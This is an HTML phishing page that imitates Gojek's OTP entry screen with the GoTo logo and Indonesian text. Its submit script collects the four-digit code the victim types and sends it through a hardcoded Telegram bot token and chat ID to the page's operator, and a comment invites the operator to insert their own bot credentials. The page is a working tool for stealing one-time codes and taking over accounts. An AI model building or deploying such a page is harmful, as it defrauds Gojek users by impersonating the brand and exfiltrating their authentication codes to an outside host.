<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>OTP Verification Gojek</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

    /* Reset and base */
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background-color: #ffffff;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      color: #000000;
    }

    /* Container */
    .container {
      padding: 1.25rem 1.25rem 0 1.25rem; /* px-5 pt-5 */
      flex-grow: 1;
    }

    /* Header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem; /* mb-6 */
    }

    .btn-icon {
      background: none;
      border: none;
      cursor: pointer;
      font-size: 1.25rem; /* text-xl */
      color: #1f2937; /* gray-900 */
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-help {
      background-color: #374151; /* gray-700 */
      color: white;
      border-radius: 9999px; /* rounded-full */
      width: 2rem; /* w-8 */
      height: 2rem; /* h-8 */
      font-size: 1.125rem; /* text-lg */
    }

    /* Title */
    h1 {
      font-weight: 600;
      font-size: 1.5rem; /* text-2xl */
      margin-bottom: 0.25rem; /* mb-1 */
      line-height: 1.25;
    }

    /* Subtitle */
    p.subtitle {
      font-size: 0.875rem; /* text-sm */
      color: #4b5563; /* gray-700 */
      margin-bottom: 1.5rem; /* mb-6 */
    }

    p.subtitle span {
      font-weight: 400;
      color: #4b5563;
    }

    /* Label */
    label {
      font-weight: 600;
      font-size: 0.75rem; /* text-xs */
      color: #4b5563; /* gray-700 */
      display: block;
      margin-bottom: 0.25rem; /* mb-1 */
    }

    label span.required {
      color: #dc2626; /* red-600 */
    }

    /* OTP inputs container */
    .otp-inputs {
      display: flex;
      justify-content: space-between;
      max-width: 20rem; /* max-w-xs */
      margin-bottom: 1rem; /* mb-4 */
      gap: 1.5rem; /* space-x-6 */
    }

    /* OTP input */
    .otp-inputs input {
      width: 2.5rem; /* w-10 */
      height: 2.5rem; /* h-10 */
      text-align: center;
      font-size: 1.125rem; /* text-lg */
      font-weight: 600;
      border: 1px solid #d1d5db; /* border-gray-300 */
      border-radius: 0.375rem; /* rounded */
      outline-offset: 2px;
      outline-color: transparent;
      transition: outline-color 0.2s ease;
    }

    .otp-inputs input:focus {
      outline-color: #2563eb; /* blue-600 */
      border-color: #2563eb;
    }

    /* Timer container */
    .timer-container {
      display: flex;
      align-items: center;
      max-width: 2rem; /* max-w-xs */
      margin-left: auto;
      gap: 0.25rem; /* space-x-1 */
      font-weight: 600;
      font-size: 0.875rem; /* text-sm */
      color: #000000;
    }

    .timer-icon {
      width: 1.25rem; /* w-5 */
      height: 1.25rem; /* h-5 */
      stroke: #047857; /* green-700 */
      stroke-width: 3;
      fill: none;
    }

    /* Horizontal line */
    hr {
      border: 1px solid #d1d5db; /* border-gray-300 */
      margin-bottom: 1.5rem; /* mb-6 */
      border-width: 1px 0 0 0;
    }

    /* Button */
    .btn-secondary {
      display: inline-block;
      border: 1px solid #9ca3af; /* border-gray-400 */
      border-radius: 9999px; /* rounded-full */
      padding: 0.25rem 1rem; /* py-1 px-4 */
      font-weight: 600;
      font-size: 0.875rem; /* text-sm */
      color: #000000;
      background-color: transparent;
      cursor: pointer;
      transition: background-color 0.2s ease, color 0.2s ease;
    }

    .btn-secondary:hover {
      background-color: #f3f4f6; /* gray-100 */
    }

    /* Footer */
    .footer {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1.5rem; /* mb-6 */
      gap: 0.25rem;
      font-size: 1.50rem; /* text-xs */
      color: #000000;
    }

    /* Image */
    .footer img {
      width: 3.75rem; /* w-60/16 = 3.75rem */
      height: 1.25rem; /* h-20/16 = 1.25rem */
      object-fit: contain;
    }

    /* Remove number input spinners */
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }

    input[type=number] {
      -moz-appearance: textfield;
    }

    /* Responsive */
    @media (max-width: 640px) {
      .otp-inputs {
        max-width: 100%;
        gap: 1rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header class="header">
      <button aria-label="Back" class="btn-icon" type="button">
        <svg aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left" viewBox="0 0 24 24" width="20" height="20"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
      </button>
      <button aria-label="Help" class="btn-icon btn-help" type="button">
        <svg aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-help" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 1 1 5.83 1c0 1.5-2 2.25-2 2.25"></path><line x1="12" y1="17" x2="12" y2="17"></line></svg>
      </button>
    </header>

    <h1>Masukkan OTP yang kami SMS</h1>
    <p class="subtitle">Kode-nya kami kirim ke <span>+628845454554</span></p>

    <form id="otpForm" onsubmit="event.preventDefault(); handleSubmit();">
      <label for="otp">OTP <span class="required">*</span></label>
      <div class="otp-inputs">
        <input aria-label="OTP digit 1" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
        <input aria-label="OTP digit 2" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
        <input aria-label="OTP digit 3" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
        <input aria-label="OTP digit 4" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
      </div>
      <div class="timer-container" aria-live="polite" aria-atomic="true">
        <svg class="timer-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
          <path d="M4 12a8 8 0 018-8" stroke-linecap="round" stroke-linejoin="round"></path>
        </svg>
        <span id="timer">00:45</span>
      </div>
    </form>

    <hr />

    <button class="btn-secondary" type="button">Coba Metode Lainnya</button>
  </div>

  <footer class="footer">
    <p>from</p>
    <img alt="goto logo in green text" src="https://upload.wikimedia.org/wikipedia/commons/8/88/GoTo_logo.svg" width="60" height="20" />
  </footer>

  <script>
    const inputs = document.querySelectorAll('input[type="text"]');
    const timerElement = document.getElementById('timer');
    let timeLeft = 45; // 45 seconds countdown

    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1) {
          if (index < inputs.length - 1) {
            inputs[index + 1].focus();
          } else {
            // All inputs filled, submit form automatically
            const allFilled = Array.from(inputs).every(i => i.value.length === 1);
            if (allFilled) {
              document.getElementById('otpForm').requestSubmit();
            }
          }
        }
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    function updateTimer() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      if (timeLeft === 0) {
        clearInterval(timerInterval);
        // Auto submit form when timer reaches 0
        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled) {
          document.getElementById('otpForm').requestSubmit();
        } else {
          alert('Waktu habis, silakan isi OTP terlebih dahulu.');
        }
      }
      timeLeft--;
    }

    const timerInterval = setInterval(updateTimer, 1000);
    updateTimer();

    async function handleSubmit() {
      const otp = Array.from(inputs).map(i => i.value).join('');

      // Ganti dengan token bot Telegram dan chat ID Anda
      const telegramBotToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
      const telegramChatId = '7549590022';

      const message = encodeURIComponent(`OTP Submitted: ${otp}`);
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`;

      try {
        const response = await fetch(url);
        if (response.ok) {
          alert('OTP berhasil dikirim ke Telegram.');
        } else {
          alert('Gagal mengirim OTP ke Telegram.');
        }
      } catch (error) {
        alert('Terjadi kesalahan saat mengirim OTP ke Telegram.');
      }
    }
  </script>
</body>
</html>
